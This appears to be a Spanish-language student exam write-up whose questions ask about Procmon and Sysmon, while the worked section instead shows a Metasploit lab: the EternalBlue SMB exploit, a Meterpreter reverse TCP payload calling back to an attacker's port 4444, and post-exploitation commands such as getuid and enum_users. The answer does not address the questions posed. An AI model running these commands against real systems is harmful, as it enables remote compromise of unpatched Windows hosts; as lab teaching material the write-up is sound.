---
title: Examen Final
date: 2024-12-26 00:00:00 -05:00
categories: [procmon, sysmon, stack pointer]
tags: [shellcode, https, iis]  # TAG names should always be lowercase
---
# Preguntas.

¿Cómo podrías utilizar Procmon y Sysmon juntos para investigar la actividad de un proceso sospechoso? (5 ptos)

Explica los tipos de eventos que Procmon y Sysmon pueden capturar de forma complementaria.

Proporciona un ejemplo práctico de cómo identificar un posible comportamiento malicioso en un proceso utilizando ambas herramientas.


#### Desarrollo

### Conexion tcp reversa
Una conexión TCP reversa es una técnica utilizada en penetration testing y ciberseguridad para establecer una conexión de red desde una máquina objetivo (victima) hacia una máquina atacante (controladora). En este contexto, la máquina atacante escucha en un puerto específico por una conexión entrante, y la máquina objetivo inicia la conexión hacia ese puerto.

````bash
use exploit/windows/smb/ms17_010_eternalblue
````
![13ms17_010_eternalblue](/assets/images/13ms17_010_eternalblue.JPG)


````bash
set payload windows/meterpreter/reverse_tcp
````
![14reverse_tcp](/assets/images/14reverse_tcp.JPG)

Se configura la dirección IP y el puerto de la máquina atacante:

![15set_lhost](/assets/images/15set_lhost.JPG)

Una vez que el exploit se ejecuta con éxito, la máquina objetivo intentará conectarse a la máquina atacante en el puerto especificado (4444 en este caso). La máquina atacante escuchará por esta conexión y, si todo está configurado correctamente, se abrirá una sesión de Meterpreter.

Una vez que obtiene la conexión tcp reversa (suficiente con utilizar una de las direcciones de retorno que permite una exitosa ejecución del exploit), investigar los permisos de la shell (es decir, del usuario que ejecuta aquella shell).

Se puede obtener Información del Sistema:
El comando sysinfo para obtener una visión general del sistema:

![16exploit](/assets/images/16exploit.JPG)

````bash
meterpreter > sysinfo
````

Usamos el comando getuid para obtener el ID del usuario actual:

````bash
meterpreter > getuid
````

Usamos el comando enum_users para listar todos los usuarios del sistema:
````bash
meterpreter > enum_users
````